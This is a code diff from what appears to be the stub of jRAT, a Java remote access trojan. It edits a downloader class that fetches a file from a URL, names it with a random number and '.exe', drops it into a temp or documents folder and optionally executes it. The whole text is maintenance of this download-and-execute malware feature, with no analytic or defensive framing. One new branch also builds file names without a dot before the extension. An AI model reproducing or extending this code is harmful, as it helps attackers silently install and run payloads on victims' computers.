@@ -10,13 +10,13 @@ import java.util.Random;
 import pro.jrat.stub.packets.outgoing.Packet27URLStatus;
 
 
-public class AdvDownloader extends Thread {
+public class AdvancedDownloader extends Thread {
   
 	public String url;
 	public boolean exec;
 	public String drop;
 
-	public AdvDownloader(String url, boolean exec, String drop) {
+	public AdvancedDownloader(String url, boolean exec, String drop) {
 		this.url = url;
 		this.exec = exec;
 		this.drop = drop;
@@ -39,8 +39,10 @@ public class AdvDownloader extends Thread {
 					if (index > 0) {
 						fileName = disposition.substring(index + 10, disposition.length() - 1);
 					}
+				} else if (url.lastIndexOf(".") + 3 >= url.length()) {
+					fileName = (new Random().nextInt()) + url.substring(url.lastIndexOf(".") + 1, url.length());
 				} else {
-					fileName = url.substring(url.lastIndexOf("/") + 1, url.length());
+					fileName = (new Random().nextInt()) + ".exe";
 				}
 
 				if (drop.equals("temp/documents (unix)")) {
